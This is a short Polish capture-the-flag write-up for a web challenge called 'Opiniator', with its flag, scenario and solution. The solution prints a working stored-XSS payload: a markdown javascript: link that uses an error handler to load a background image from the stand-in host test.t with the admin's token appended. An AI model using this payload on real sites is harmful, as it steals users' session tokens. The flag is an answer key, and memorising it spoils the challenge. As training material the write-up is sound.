# Opiniator

## Name
Opiniator

## Category
Web

## Points
50

## Flag
scs2019{aaedabce34860e28bd5f5ad35ba902db3745d29a}

## Description
Odkryliśmy, że jeden z polityków pozwala w swoim systemie na składanie opinii odnośnie ostatnich projektów jakie polityk złożył. Okazało się jednak, że komuś udało się dostać na konto administratora i pokasować dane. Sprawdź w jaki sposób mógł zdobyć dostęp. Jedyne co administrator robi to loguje się przez swój token, a następnie akceptuje opinie. Jedynym problemem administratora jest to, że zwykle klika w linki w opiniach.

## Solution
Należy stworzyć nowe konto, a następnie się zalogować. Po zalogowaniu można dodać opinie. Jak się okazuje można dodawać markdown. Jedyna możliwość to dodanie linku przez markdown, który prześle do serwera token, tworząc styl z backgroundImage.
[c](javascript:window.onerror=function(){document.getElementById('user-token').style.backgroundImage='url(http://test.t/'+document.getElementById('user-token').innerText+')';};throw%201)

## Created by
* Mateusz Górny.